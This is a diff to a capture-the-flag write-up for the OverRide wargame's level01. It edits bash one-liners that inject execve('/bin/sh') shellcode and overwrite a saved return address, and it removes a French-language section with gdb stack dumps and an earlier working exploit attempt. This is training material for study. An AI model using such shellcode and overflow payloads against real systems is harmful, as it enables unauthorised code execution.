@@ -45,7 +45,7 @@ $5 = 0x804a047
 Exploit the program:
 
 ```bash
-level01@OverRide:~$ (python -c 'print "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"';python -c 'print "\x41" * 80 + "\x47\xa0\x04\x08"';cat) | ./level01 
+level01@OverRide:~$ (python -c 'print "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "\x41" * 80 + "\x47\xa0\x04\x08"'; cat) | ./level01 
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
@@ -83,7 +83,7 @@ Breakpoint 1, 0x08048574 in main ()
 Try to exploit:
 
 ```bash
-level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x41" * (80 - 28) + "\x8c\xd6\xff\xff"';cat) | ./level01 
+level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x41" * (80 - 28) + "\x9c\xd6\xff\xff"'; cat) | ./level01 
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
@@ -115,7 +115,7 @@ Breakpoint 1, 0x08048574 in main ()
 Try to exploit:
 
 ```bash
-level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x41" * (80 - 28) + "\x9c\xd6\xff\xff"';cat) | ./level01 
+level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x41" * (80 - 28) + "\x8c\xd6\xff\xff"';cat) | ./level01 
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
@@ -147,54 +147,3 @@ nope, incorrect password...
 whoami
 level02
 ```
-
-=======
-
-Si nous comparons l adresse qui est dans le deuxieme fgets et l adresse de save eip, nous constatons qu'il n y a que 80 byte de difference et que fgets en lit 100
-
-Nous pouvons donc ecraser save eip dans le deuxieme fgets et nous avons de la place pour mettre notre shellcode
-
-r <<< $(python -c 'print "dat_wil" + "A" * (247) + "\n" + "\x90" * 80 + "\x25\xd7\xff\xff" + "B" * 14 + "\n"')
-
-0x08048579 in main ()
-(gdb) x/80bx 0xffffd6ec
-0xffffd6ec:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd6f4:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd6fc:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd704:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd70c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd714:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd71c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd724:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd72c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd734:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-
-0xffffd72c in ?? ()
-(gdb) x/80bx 0xffffd6ec
-0xffffd6ec:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd6f4:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd6fc:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd704:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd70c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd714:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd71c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd724:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xffffd72c:     0x01    0x00    0x00    0x00    0x90    0x90    0x90    0x90
-0xffffd734:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-
-
-On peut voir que 4 bytes sont ecraser a partir de l adresse 0xffffd72c
-
-Nous devons donc placer notre shellcode avant si nous le placons dans le deuxieme input
-
-(gdb) r <<< $(python -c 'print "dat_wil" + "A" * 247 + "\n" + "\x90" * (64-23) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x55" * 16 + "\x04\xd7\xff\xff" + "B" * 14 + "\n"')
-Starting program: /home/users/level01/level01 <<< $(python -c 'print "dat_wil" + "A" * 247 + "\n" + "\x90" * (64-23) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x55" * 16 + "\x04\xd7\xff\xff" + "B" * 14 + "\n"')
-********* ADMIN LOGIN PROMPT *********
-Enter Username: verifying username....
-
-Enter Password: 
-nope, incorrect password...
-
-process 1900 is executing new program: /bin/dash
-warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
-Architecture of file not recognized.
